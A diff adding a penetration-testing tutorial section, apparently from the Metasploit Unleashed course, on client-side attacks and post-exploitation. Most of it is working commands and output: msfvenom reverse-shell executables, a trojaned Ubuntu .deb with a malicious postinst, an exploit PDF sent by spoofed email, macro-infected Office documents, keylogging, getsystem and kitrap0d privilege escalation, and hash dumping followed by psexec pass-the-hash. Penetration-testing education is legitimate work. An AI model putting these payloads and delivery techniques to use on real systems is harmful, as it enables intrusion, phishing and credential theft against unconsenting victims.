@@ -6678,3 +6678,4906 @@ Success! Not all exploits are this easy to port over but the time spent is well 
  https://github.com/rapid7/metasploit-framework/blob/master/HACKING
 
 https://github.com/rapid7/metasploit-framework/blob/master/CONTRIBUTING.md
+
+
+******************
+Client Sides attacks
+*******************
+
+Client side attacks are always a fun topic and a major front for attackers today. As network administrators and software developers fortify the perimeter, pentesters need to find a way to make the victims open the door for them to get into the network. Client side attacks require user-interaction such as enticing them to click a link, open a document, or somehow get to your malicious website.
+
+There are many different ways of using Metasploit to perform client-side attacks and we will demonstrate a few of them here.
+
+Binary Payloads
+===============
+
+It seems like Metasploit is full of interesting and useful features. One of these is the ability to generate an executable from a Metasploit payload. This can be very useful in situations such as social engineering; if you can get a user to run your payload for you, there is no reason to go through the trouble of exploiting any software.
+
+Let’s look at a quick example of how to do this. We will generate a reverse shell payload, execute it on a remote system, and get our shell. To do this, we will use the command line tool msfvenom. This command can be used for generating payloads to be used in many locations and offers a variety of output options, from perl to C to raw. We are interested in the executable output, which is provided by the ‘-f exe‘ option.
+
+We’ll generate a Windows reverse shell executable that will connect back to us on port 31337.
+
+::
+
+  root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
+ Options for payload/windows/shell/reverse_tcp:
+
+
+       Name: Windows Command Shell, Reverse TCP Stager
+     Module: payload/windows/shell/reverse_tcp
+   Platform: Windows
+       Arch: x86
+ Needs Admin: No
+ Total size: 281
+       Rank: Normal
+
+ Provided by:
+    spoonm
+    sf
+    hdm
+    skape
+
+ Basic options:
+ Name      Current Setting  Required  Description
+ ----      ---------------  --------  -----------
+ EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+ LHOST                      yes       The listen address
+ LPORT     4444             yes       The listen port
+
+ Description:
+  Spawn a piped command shell (staged). Connect back to the attacker
+
+
+::
+
+  root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+ Found 1 compatible encoders
+ Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+ x86/shikata_ga_nai succeeded with size 326 (iteration=0)
+ x86/shikata_ga_nai chosen with final size 326
+ Payload size: 326 bytes
+ Saved as: /tmp/1.exe
+
+ root@kali:~# file /tmp/1.exe
+ /tmp/1.exe: PE32 executable (GUI) Intel 80386, for MS Windows
+
+
+Now we see we have a Windows executable ready to go. Now, we will use multi/handler, which is a stub that handles exploits launched outside of the framework.
+
+::
+
+  root@kali:~# msfconsole -q
+ msf > use exploit/multi/handler
+ msf exploit(handler) > show options
+
+ Module options:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+When using the exploit/multi/handler module, we still need to tell it which payload to expect so we configure it to have the same settings as the executable we generated.
+
+::
+
+  msf exploit(handler) > set payload windows/shell/reverse_tcp
+ payload => windows/shell/reverse_tcp
+ msf exploit(handler) > show options
+
+ Module options:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+ Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique: seh, thread, process
+   LHOST                      yes       The local address
+   LPORT     4444             yes       The local port
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+ msf exploit(handler) > set LHOST 172.16.104.130
+ LHOST => 172.16.104.130
+ msf exploit(handler) > set LPORT 31337
+ LPORT => 31337
+ msf exploit(handler) >
+
+Now that we have everything set up and ready to go, we run exploit for the multi/handler and execute our generated executable on the victim. The multi/handler handles the exploit for us and presents us our shell.
+
+::
+
+  msf exploit(handler) > exploit
+
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Starting the payload handler...
+ [*] Sending stage (474 bytes)
+ [*] Command shell session 2 opened (172.16.104.130:31337 -> 172.16.104.128:1150)
+
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+
+ C:\Documents and Settings\Victim\My Documents>
+
+Binary Linux Trojan
+^^^^^^^^^^^^^^^^^^
+
+In order to demonstrate that client side attacks and trojans are not exclusive to the Windows world, we will package a Metasploit payload in with an Ubuntu deb package to give us a shell on Linux. An excellent video was made by Redmeat_uk demonstrating this technique that you can view at http://securitytube.net/Ubuntu-Package-Backdoor-using-a-Metasploit-Payload-video.aspx
+
+We first need to download the package that we are going to infect and move it to a temporary working directory. In our example, we will use the package freesweep, a text-based version of Mine Sweeper.
+
+::
+
+  root@kali:~# apt-get --download-only install freesweep
+ Reading package lists... Done
+ Building dependency tree
+ Reading state information... Done
+ ...snip...
+ root@kali:~# mkdir /tmp/evil
+ root@kali:~# mv /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil
+ root@kali:~# cd /tmp/evil/
+ root@kali:/tmp/evil#
+
+Next, we need to extract the package to a working directory and create a DEBIAN directory to hold our additional added “features”.
+
+::
+
+  root@kali:/tmp/evil# dpkg -x freesweep_0.90-1_i386.deb work
+ root@kali:/tmp/evil# mkdir work/DEBIAN
+
+In the DEBIAN directory, create a file named control that contains the following:
+
+::
+
+  root@kali:/tmp/evil/work/DEBIAN# cat control
+ Package: freesweep
+ Version: 0.90-1
+ Section: Games and Amusement
+ Priority: optional
+ Architecture: i386
+ Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
+ Description: a text-based minesweeper
+  Freesweep is an implementation of the popular minesweeper game, where
+  one tries to find all the mines without igniting any, based on hints given
+  by the computer. Unlike most implementations of this game, Freesweep
+  works in any visual text display - in Linux console, in an xterm, and in
+  most text-based terminals currently in use.
+
+We also need to create a post-installation script that will execute our binary. In our DEBIAN directory, we’ll create a file named postinst that contains the following :
+
+::
+
+  root@kali:/tmp/evil/work/DEBIAN# cat postinst
+ #!/bin/sh
+
+ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &
+
+Now we’ll create our malicious payload. We’ll be creating a reverse shell to connect back to us named freesweep_scores.
+
+::
+
+  root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
+ Found 10 compatible encoders
+ Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+ x86/shikata_ga_nai succeeded with size 98 (iteration=0)
+ x86/shikata_ga_nai chosen with final size 98
+ Payload size: 98 bytes
+ Saved as: /tmp/evil/work/usr/games/freesweep_scores
+
+We’ll now make our post-installation script executable and build our new package. The built file will be named work.deb so we will want to change that to freesweep.deb and copy the package to our web root directory.
+
+::
+
+  root@kali:/tmp/evil/work/DEBIAN# chmod 755 postinst
+ root@kali:/tmp/evil/work/DEBIAN# dpkg-deb --build /tmp/evil/work
+ dpkg-deb: building package `freesweep' in `/tmp/evil/work.deb'.
+ root@kali:/tmp/evil# mv work.deb freesweep.deb
+ root@kali:/tmp/evil# cp freesweep.deb /var/www/
+
+If it is not already running, we’ll need to start the Apache web server.
+
+::
+
+  root@kali:/tmp/evil# service apache2 start
+
+ We will need to set up the Metasploit multi/handler to receive the incoming connection.
+
+ root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
+ PAYLOAD => linux/x86/shell/reverse_tcp
+ LHOST => 192.168.1.101
+ LPORT => 443
+ [*] Started reverse handler on 192.168.1.101:443
+ [*] Starting the payload handler...
+
+On our Ubuntu victim, we have somehow convinced the user to download and install our awesome new game.
+
+::
+
+  ubuntu@ubuntu:~$ wget http://192.168.1.101/freesweep.deb
+
+ ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb
+
+As the victim installs and plays our game, we have received a shell!
+
+
+::
+
+  [*] Sending stage (36 bytes)
+ [*] Command shell session 1 opened (192.168.1.101:443 -> 192.168.1.175:1129)
+
+ ifconfig
+ eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6
+ inet addr:192.168.1.175 Bcast:192.168.1.255 Mask:255.255.255.0
+ UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
+ RX packets:49 errors:0 dropped:0 overruns:0 frame:0
+ TX packets:51 errors:0 dropped:0 overruns:0 carrier:0
+ collisions:0 txqueuelen:1000
+ RX bytes:43230 (42.2 KiB) TX bytes:4603 (4.4 KiB)
+ Interrupt:17 Base address:0x1400
+ ...snip...
+
+ hostname
+ ubuntu
+ id
+ uid=0(root) gid=0(root) groups=0(root)
+
+
+Client Side Exploits
+===================
+
+As we have already discussed, Metasploit has many uses and another one we will discuss here is client side exploits. To show the power of how MSF can be used in client side exploits we will use a story.
+
+In the security world, social engineering has become an increasingly used attack vector. Even though technologies are changing, one thing that seems to stay the same is the lack of security with people. Due to that, social engineering has become a very “hot” topic in the security world today.
+
+In our first scenario our attacker has been doing a lot of information gathering using tools such as the Metasploit Framework, Maltego and other tools to gather email addresses and information to launch a social engineering client side exploit on the victim.
+
+After a successful dumpster dive and scraping for emails from the web, he has gained two key pieces of information.
+
+1) They use “Best Computers” for technical services.
+
+2) The IT Dept has an email address of itdept@victim.com
+
+We want to gain shell on the IT Departments computer and run a key logger to gain passwords, intel or any other juicy tidbits of info.
+
+We start off by loading our msfconsole. After we are loaded we want to create a malicious PDF that will give the victim a sense of security in opening it. To do that, it must appear legit, have a title that is realistic, and not be flagged by anti-virus or other security alert software.
+
+We are going to be using the Adobe Reader ‘util.printf()’ JavaScript Function Stack Buffer Overflow Vulnerability. Adobe Reader is prone to a stack-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data. An attacker can exploit this issue to execute arbitrary code with the privileges of the user running the application or crash the application, denying service to legitimate users.
+
+So we start by creating our malicious PDF file for use in this client side exploit.
+
+::
+
+  msf > use exploit/windows/fileformat/adobe_utilprintf
+ msf exploit(adobe_utilprintf) > set FILENAME BestComputers-UpgradeInstructions.pdf
+ FILENAME => BestComputers-UpgradeInstructions.pdf
+ msf exploit(adobe_utilprintf) > set PAYLOAD windows/meterpreter/reverse_tcp
+ PAYLOAD => windows/meterpreter/reverse_tcp
+ msf exploit(adobe_utilprintf) > set LHOST 192.168.8.128
+ LHOST => 192.168.8.128
+ msf exploit(adobe_utilprintf) > set LPORT 4455
+ LPORT => 4455
+ msf exploit(adobe_utilprintf) > show options
+
+ Module options (exploit/windows/fileformat/adobe_utilprintf):
+
+   Name      Current Setting                        Required  Description
+   ----      ---------------                        --------  -----------
+   FILENAME  BestComputers-UpgradeInstructions.pdf  yes       The file name.
+
+
+ Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.8.128    yes       The listen address
+   LPORT     4455             yes       The listen port
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Adobe Reader v8.1.2 (Windows XP SP3 English)
+
+Once we have all the options set the way we want, we run “exploit” to create our malicious file.
+
+::
+
+  msf exploit(adobe_utilprintf) > exploit
+
+ [*] Creating 'BestComputers-UpgradeInstructions.pdf' file...
+ [*] BestComputers-UpgradeInstructions.pdf stored at /root/.msf4/local/BestComputers-UpgradeInstructions.pdf
+ msf exploit(adobe_utilprintf) >
+
+So we can see that our pdf file was created in a sub-directory of where we are. So lets copy it to our /tmp directory so it is easier to locate later on in our exploit. Before we send the malicious file to our victim we need to set up a listener to capture this reverse connection. We will use msfconsole to set up our multi handler listener.
+
+::
+
+  msf > use exploit/multi/handler
+ msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+ PAYLOAD => windows/meterpreter/reverse_tcp
+ msf exploit(handler) > set LPORT 4455
+ LPORT => 4455
+ msf exploit(handler) > set LHOST 192.168.8.128
+ LHOST => 192.168.8.128
+ msf exploit(handler) > exploit
+
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Starting the payload handler...
+
+
+Now that our listener is waiting to receive its malicious payload we have to deliver this payload to the victim and since in our information gathering we obtained the email address of the IT Department we will use a handy little script called sendEmail to deliver this payload to the victim. With a kung-fu one-liner, we can attach the malicious pdf, use any smtp server we want and write a pretty convincing email from any address we want….
+
+
+::
+
+  root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
+ Reading message body from STDIN because the '-m' option was not used.
+ If you are manually typing in a message:
+  - First line must be received within 60 seconds.
+  - End manual input with a CTRL-D on its own line.
+
+ IT Dept,
+
+ We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.
+
+ Sincerely,
+
+ Best Computers Tech Support
+ Aug 24 17:32:51 kali sendEmail[13144]: Message input complete.
+ Aug 24 17:32:51 kali sendEmail[13144]: Email was sent successfully!
+
+
+As we can see here, the script allows us to put any FROM (-f) address, any TO (-t) address, any SMTP (-s) server as well as Titles (-u) and our malicious attachment (-a). Once we do all that and press enter we can type any message we want, then press CTRL+D and this will send the email out to the victim.
+
+Now on the victim’s machine, our IT Department employee is getting in for the day and logging into his computer to check his email.
+
+He sees the very important document and copies it to his desktop as he always does, so he can scan this with his favorite anti-virus program.
+
+
+As we can see, it passed with flying colors so our IT admin is willing to open this file to quickly implement these very important upgrades. Clicking the file opens Adobe but shows a greyed out window that never reveals a PDF. Instead, on the attackers machine what is revealed….
+
+::
+
+  [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Starting the payload handler...
+ [*] Sending stage (718336 bytes)
+ session[*] Meterpreter session 1 opened (192.168.8.128:4455 -> 192.168.8.130:49322)
+
+ meterpreter >
+
+
+We now have a shell on their computer through a malicious PDF client side exploit. Of course what would be wise at this point is to move the shell to a different process, so when they kill Adobe we don’t lose our shell. Then obtain system info, start a key logger and continue exploiting the network.
+
+
+::
+
+  meterpreter > ps
+
+ Process list
+ ============
+
+    PID   Name            Path
+    ---   ----            ----
+    852   taskeng.exe     C:\Windows\system32\taskeng.exe
+    1308  Dwm.exe         C:\Windows\system32\Dwm.exe
+    1520  explorer.exe    C:\Windows\explorer.exe
+    2184  VMwareTray.exe  C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    2196  VMwareUser.exe  C:\Program FilesVMware\VMware Tools\VMwareUser.exe
+    3176  iexplore.exe    C:\Program Files\Internet Explorer\iexplore.exe
+    3452  AcroRd32.exe    C:\Program Files\AdobeReader 8.0\ReaderAcroRd32.exe
+
+ meterpreter > run post/windows/manage/migrate
+
+ [*] Running module against V-MAC-XP
+ [*] Current server process: svchost.exe (1076)
+ [*] Migrating to explorer.exe...
+ [*] Migrating into process ID 816
+ [*] New server process: Explorer.EXE (816)
+
+ meterpreter > sysinfo
+ Computer: OFFSEC-PC
+ OS      : Windows Vista (Build 6000, ).
+
+ meterpreter > use priv
+ Loading extension priv...success.
+
+ meterpreter > run post/windows/capture/keylog_recorder
+
+ [*] Executing module against V-MAC-XP
+ [*] Starting the keystroke sniffer...
+ [*] Keystrokes being saved in to /root/.msf4/loot/20110323091836_default_192.168.1.195_host.windows.key_832155.txt
+ [*] Recording keystrokes...
+
+ root@kali:~# cat /root/.msf4/loot/20110323091836_default_192.168.1.195_host.windows.key_832155.txt
+ Keystroke log started at Wed Mar 23 09:18:36 -0600 2011
+ Support,   I tried to open ti his file 2-3 times with no success.  I even had my admin and CFO tru   y it, but no one can get it to p open.  I turned on the rmote access server so you can log in to fix our p         this problem.  Our user name is admin and password for that session is 123456.   Call or eme ail when you are done.   Thanks IT Dept
+
+
+VBScript Infection Methods
+========================
+
+
+Metasploit has a couple of built in methods you can use to infect Word and Excel documents with malicious Metasploit payloads. You can also use your own custom payloads as well. It doesn’t necessarily need to be a Metasploit payload. This method is useful when going after client-side attacks and could also be potentially useful if you have to bypass some sort of filtering that does not allow executables and only permits documents to pass through. To begin, we first need to create our VBScript payload.
+
+::
+
+  root@kali: # msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 -e x86/shikata_ga_nai -f vba-exe
+ Found 1 compatible encoders
+ Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+ x86/shikata_ga_nai succeeded with size 326 (iteration=0)
+ x86/shikata_ga_nai chosen with final size 326
+ Payload size: 326 bytes
+ '**************************************************************
+ '*
+ '* This code is now split into two pieces:
+ '*  1. The Macro. This must be copied into the Office document
+ '*     macro editor. This macro will run on startup.
+ '*
+ '*  2. The Data. The hex dump at the end of this output must be
+ '*     appended to the end of the document contents.
+ '*
+ ...snip...
+
+
+As the output message, indicates, the script is in 2 parts. The first part of the script is created as a macro and the second part is appended into the document text itself. You will need to transfer this script over to a machine with Windows and Office installed and perform the following:
+
+
+::
+
+  Word/Excel 2003: Tools -> Macros -> Visual Basic Editor
+ Word/Excel 2007: View Macros -> then place a name like "moo" and select "create".
+
+This will open up the visual basic editor. Paste the output of the first portion of the payload script into the editor, save it and then paste the remainder of the script into thel word document itself. This is when you would perform the client-side attack by emailing this Word document to someone.
+
+In order to keep user suspicion low, try embedding the code in one of the many Word/Excel games that are available on the Internet. That way, the user is happily playing the game while you are working in the background. This gives you some extra time to migrate to another process if you are using Meterpreter as a payload.
+
+Before we send off our malicious document to our victim, we first need to set up our Metasploit listener.
+
+::
+
+  root@kali:# msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.101; set LPORT 8080; run; exit -y"
+
+                 ##                          ###           ##    ##
+  ##  ##  #### ###### ####  #####   #####    ##    ####        ######
+ ####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
+ ####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
+ ## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
+ ##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
+                                      ##
+
+
+        =[ metasploit v4.11.4-2015071402                   ]
+ + -- --=[ 1467 exploits - 840 auxiliary - 232 post        ]
+ + -- --=[ 432 payloads - 37 encoders - 8 nops             ]
+
+ PAYLOAD => windows/meterpreter/reverse_tcp
+ LHOST => 192.168.1.101
+ LPORT => 8080
+ [*] Started reverse handler on 192.168.1.101:8080
+ [*] Starting the payload handler...
+
+
+Now we can test out the document by opening it up and check back to where we have our Metasploit exploit/multi/handler listener:
+
+
+::
+
+  [*] Sending stage (749056 bytes) to 192.168.1.150
+  [*] Meterpreter session 1 opened (192.168.1.101:8080 -> 192.168.1.150:52465) at Thu Nov 25 16:54:29 -0700 2010
+
+ meterpreter > sysinfo
+ Computer: XEN-WIN7-PROD
+ OS      : Windows 7 (Build 7600, ).
+ Arch    : x64 (Current Process is WOW64)
+ Language: en_US
+ meterpreter > getuid
+ Server username: xen-win7-prod\dookie
+ meterpreter >
+
+Success! We have a Meterpreter shell right to the system that opened the document, and best of all, it doesn’t get picked up by anti-virus!!!
+
+
+***********************
+MSF Post Exploitation
+***********************
+
+After working so hard to successfully exploit a system, what do we do next?
+
+We will want to gain further access to the targets internal networks by pivoting and covering our tracks as we progress from system to system. A pentester may also opt to sniff packets for other potential victims, edit their registries to gain further information or access, or set up a backdoor to maintain more permanent system access.
+
+Utilizing these techniques will ensure that we maintain some level of access and can potentially lead to deeper footholds into the targets trusted infrastructure.
+
+Privilege Escalation
+=====================
+
+Frequently, especially with client side exploits, you will find that your session only has limited user rights. This can severely limit actions you can perform on the remote system such as dumping passwords, manipulating the registry, installing backdoors, etc. Fortunately, Metasploit has a Meterpreter script, ‘getsystem’, that will use a number of different techniques to attempt to gain SYSTEM level privileges on the remote system. There are also various other (local) exploits that can be used to also escalate privileges.
+
+Using the infamous ‘Aurora’ exploit, we see that our Meterpreter session is only running as a regular user account.
+
+::
+
+  msf exploit(ms10_002_aurora) >
+ [*] Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161
+ [*] Sending stage (748544 bytes) to 192.168.1.161
+ [*] Meterpreter session 3 opened (192.168.1.71:38699 -> 192.168.1.161:4444) at 2010-08-21 13:39:10 -0600
+
+ msf exploit(ms10_002_aurora) > sessions -i 3
+ [*] Starting interaction with 3...
+
+ meterpreter > getuid
+ Server username: XEN-XP-SP2-BARE\victim
+ meterpreter >
+
+
+GetSystem
+^^^^^^^^^^^^^^
+
+To make use of the ‘getsystem’ command, if its not already loaded we will need to first load the ‘priv’ extension.
+
+::
+
+  meterpreter > use priv
+ Loading extension priv...success.
+ meterpreter >
+
+
+Running getsystem with the “-h” switch will display the options available to us.
+
+
+::
+
+  meterpreter > getsystem -h
+ Usage: getsystem [options]
+
+ Attempt to elevate your privilege to that of local system.
+
+ OPTIONS:
+
+    -h        Help Banner.
+    -t <opt>  The technique to use. (Default to '0').
+		0 : All techniques available
+		1 : Service - Named Pipe Impersonation (In Memory/Admin)
+		2 : Service - Named Pipe Impersonation (Dropper/Admin)
+		3 : Service - Token Duplication (In Memory/Admin)
+
+
+ meterpreter >
+
+
+We will let Metasploit try to do the heavy lifting for us by running “getsystem” without any options. The script will attempt every method available to it, stopping when it succeeds. Within the blink of an eye, our session is now running with SYSTEM privileges.
+
+::
+
+  meterpreter > getsystem
+ ...got system (via technique 1).
+ meterpreter > getuid
+ Server username: NT AUTHORITY\SYSTEM
+ meterpreter >
+
+
+Local Exploits
+^^^^^^^^^^^^^^
+
+There are situations where getsystem fails. For example:
+
+::
+
+  meterpreter > getsystem
+ [-] priv_elevate_getsystem: Operation failed: Access is denied.
+ meterpreter >
+
+When this happens, we are able to background the session, and manually try some additional exploits that Metasploit has to offer. Note: The available exploits will change over time.
+
+
+::
+
+  meterpreter > background
+ [*] Backgrounding session 1...
+ msf exploit(ms10_002_aurora) > use exploit/windows/local/
+ ...snip...
+ use exploit/windows/local/bypassuac
+ use exploit/windows/local/bypassuac_injection
+ ...snip...
+ use exploit/windows/local/ms10_015_kitrap0d
+ use exploit/windows/local/ms10_092_schelevator
+ use exploit/windows/local/ms11_080_afdjoinleaf
+ use exploit/windows/local/ms13_005_hwnd_broadcast
+ use exploit/windows/local/ms13_081_track_popup_menu
+ ...snip...
+ msf exploit(ms10_002_aurora) >
+
+Let’s try and use the famous kitrap0d exploit on our target. Our example box is a 32-bit machine and is listed as one of the vulnerable targets…
+
+::
+
+  msf exploit(ms10_002_aurora) > use exploit/windows/local/ms10_015_kitrap0d
+ msf exploit(ms10_015_kitrap0d) > set SESSION 1
+ msf exploit(ms10_015_kitrap0d) > set PAYLOAD windows/meterpreter/reverse_tcp
+ msf exploit(ms10_015_kitrap0d) > set LHOST 192.168.1.161
+ msf exploit(ms10_015_kitrap0d) > set LPORT 4443
+ msf exploit(ms10_015_kitrap0d) > show options
+
+ Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+ Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
+   LHOST     192.168.1.161    yes       The listen address
+   LPORT     4443             yes       The listen port
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 2K SP4 - Windows 7 (x86)
+
+
+ msf exploit(ms10_015_kitrap0d) > exploit
+
+ [*]  Started reverse handler on 192.168.1.161:4443
+ [*]  Launching notepad to host the exploit...
+ [+]  Process 4048 launched.
+ [*]  Reflectively injecting the exploit DLL into 4048...
+ [*]  Injecting exploit into 4048 ...
+ [*]  Exploit injected. Injecting payload into 4048...
+ [*]  Payload injected. Executing exploit...
+ [+]  Exploit finished, wait for (hopefully privileged) payload execution to complete.
+ [*]  Sending stage (769024 bytes) to 192.168.1.71
+ [*]  Meterpreter session 2 opened (192.168.1.161:4443 -> 192.168.1.71:49204) at 2014-03-11 11:14:00 -0400
+
+ meterpreter > getuid
+ Server username: NT AUTHORITY\SYSTEM
+ meterpreter >
+
+
+PSExec Pass the Hash
+===================
+
+The psexec module is often used by penetration testers to obtain access to a given system that you already know the credentials for. It was written by sysinternals and has been integrated within the framework. Often as penetration testers, we successfully gain access to a system through some exploit, use meterpreter to grab the passwords or other methods like fgdump, pwdump, or cachedump and then utilize rainbowtables to crack those hash values.
+
+We also have other options like pass the hash through tools like iam.exe. One great method with psexec in metasploit is it allows you to enter the password itself, or you can simply just specify the hash values, no need to crack to gain access to the system. Let’s think deeply about how we can utilize this attack to further penetrate a network. Lets first say we compromise a system that has an administrator password on the system, we don’t need to crack it because psexec allows us to utilize just the hash values, that administrator account is the same on every account within the domain infrastructure. We can now go from system to system without ever having to worry about cracking the password. One important thing to note on this is that if NTLM is only available (for example its a 15+ character password or through GPO they specify NTLM response only), simply replace the ****NOPASSWORD**** with 32 0’s for example:
+
+::
+
+  ******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c
+
+Would be replaced by:
+
+::
+
+  00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c
+
+
+While testing this in your lab, you may encounter the following error even though you are using the correct credentials:
+
+::
+
+  STATUS_ACCESS_DENIED (Command=117 WordCount=0)
+
+
+This can be remedied by navigating to the registry key, “HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” on the target systems and setting the value of “RequireSecuritySignature” to “0”.
+
+::
+
+  [*] Meterpreter session 1 opened (192.168.57.139:443 -> 192.168.57.131:1042)
+
+ meterpreter > run post/windows/gather/hashdump
+
+ [*] Obtaining the boot key...
+ [*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+ [*] Obtaining the user list and keys...
+ [*] Decrypting user keys...
+ [*] Dumping password hashes...
+
+ Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+ meterpreter >
+
+
+Now that we have a meterpreter console and dumped the hashes, lets connect to a different victim using PSExec and just the hash values.
+
+::
+
+  root@kali:~# msfconsole
+
+                 ##                          ###           ##    ##
+  ##  ##  #### ###### ####  #####   #####    ##    ####        ######
+ ####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
+ ####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
+ ## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
+ ##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
+                                      ##
+
+
+        =[ metasploit v4.2.0-dev [core:4.2 api:1.0]
+ + -- --=[ 787 exploits - 425 auxiliary - 128 post
+ + -- --=[ 238 payloads - 27 encoders - 8 nops
+        =[ svn r14551 updated yesterday (2012.01.14)
+
+ msf > search psexec
+
+ Exploits
+ ========
+
+    Name                       Description
+    ----                       -----------
+    windows/smb/psexec         Microsoft Windows Authenticated User Code Execution
+    windows/smb/smb_relay      Microsoft Windows SMB Relay Code Execution
+
+ msf > use exploit/windows/smb/psexec
+ msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+ payload => windows/meterpreter/reverse_tcp
+ msf exploit(psexec) > set LHOST 192.168.57.133
+ LHOST => 192.168.57.133
+ msf exploit(psexec) > set LPORT 443
+ LPORT => 443
+ msf exploit(psexec) > set RHOST 192.168.57.131
+ RHOST => 192.168.57.131
+ msf exploit(psexec) > show options
+
+ Module options:
+
+    Name     Current Setting  Required  Description
+    ----     ---------------  --------  -----------
+    RHOST    192.168.57.131   yes       The target address
+    RPORT    445              yes       Set the SMB service port
+    SMBPass                   no        The password for the specified username
+    SMBUser  Administrator    yes       The username to authenticate as
+
+
+ Payload options (windows/meterpreter/reverse_tcp):
+
+    Name      Current Setting  Required  Description
+    ----      ---------------  --------  -----------
+    EXITFUNC  thread           yes       Exit technique: seh, thread, process
+    LHOST     192.168.57.133   yes       The local address
+    LPORT     443              yes       The local port
+
+
+ Exploit target:
+
+    Id  Name
+    --  ----
+    0   Automatic
+
+
+ msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+ SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+ msf exploit(psexec) > exploit
+
+ [*] Connecting to the server...
+ [*] Started reverse handler
+ [*] Authenticating as user 'Administrator'...
+ [*] Uploading payload...
+ [*] Created \KoVCxCjx.exe...
+ [*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.131[\svcctl] ...
+ [*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.131[\svcctl] ...
+ [*] Obtaining a service manager handle...
+ [*] Creating a new service (XKqtKinn - "MSSeYtOQydnRPWl")...
+ [*] Closing service handle...
+ [*] Opening service...
+ [*] Starting the service...
+ [*] Removing the service...
+ [*] Closing service handle...
+ [*] Deleting \KoVCxCjx.exe...
+ [*] Sending stage (719360 bytes)
+ [*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1045)
+
+ meterpreter > shell
+ Process 3680 created.
+ Channel 1 created.
+ Microsoft Windows [Version 5.2.3790]
+ (C) Copyright 1985-2003 Microsoft Corp.
+
+ C:\WINDOWS\system32>
+
+
+That is it! We successfully connect to a seperate computer with the same credentials without having to worry about rainbowtables or cracking the password. Special thanks to Chris Gates for the documentation on this.
+
+
+Event Log Management
+==================
+
